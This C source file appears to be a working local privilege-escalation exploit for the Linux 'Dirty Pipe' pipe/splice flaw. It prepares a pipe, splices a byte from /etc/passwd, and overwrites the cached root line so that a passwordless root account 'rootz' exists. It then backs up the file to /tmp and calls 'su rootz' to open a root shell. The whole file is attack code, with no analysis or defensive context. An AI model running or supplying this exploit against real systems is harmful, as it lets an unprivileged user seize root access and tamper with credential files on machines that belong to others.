#define _GNU_SOURCE

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

#define PAGE_SIZE   4096
#define TARGET_FILE "/etc/passwd"

void prepare_pipe(int p[2]) {

  if(pipe(p))
    exit(5);

  char buffer[PAGE_SIZE];
  int pipe_size = fcntl(p[1], F_GETPIPE_SZ);
  int temp;

  temp = pipe_size;
  while(temp > 0) {
    int fill = temp > sizeof(buffer) ? sizeof(buffer) : temp;
    write(p[1], buffer, fill);
    temp -= fill;
  }

  temp = pipe_size;
  while(temp > 0) {
    int fill = temp > sizeof(buffer) ? sizeof(buffer) : temp;
    read(p[0], buffer, fill);
    temp -= fill;
  }

}

int main(int argc, char **argv) {

  struct stat st;
  loff_t start_offset = 4;
  int p[2];

  puts("[+] Backing up /etc/passwd to /tmp/passwd");
  system("cp /etc/passwd /tmp/passwd");

  char *data = "z::0:0:root:/root:/bin/bash\n";
  int data_size = strlen(data);

  if(start_offset % PAGE_SIZE == 0) {
    fprintf(stderr, "[-] Cannot start writing at a page boundary\n");
    return 1;
  }

  loff_t next_page = start_offset | (PAGE_SIZE - 1) + 1;
  loff_t end_offset = start_offset + data_size;

  if(end_offset > next_page) {
    fprintf(stderr, "[-] Cannot write across a page\n");
    return 2;
  }

  int fd = open(TARGET_FILE, O_RDONLY);
  fstat(fd, &st);

  if(start_offset > st.st_size) {
    fprintf(stderr, "[-] Start offset is not inside target file\n");
    return 3;
  }

  if(end_offset > st.st_size) {
    fprintf(stderr, "[-] End offset is not inside target file. Cannot enlarge file\n");
    return 4;
  }

  prepare_pipe(p);

  start_offset--;
  splice(fd, &start_offset, p[1], NULL, 1, 0);

  write(p[1], data, data_size);

  puts("[+] Successfully overwritten passwd root line");
  puts("[+] Popping root shell");
  system("su rootz");

  return 0;

}
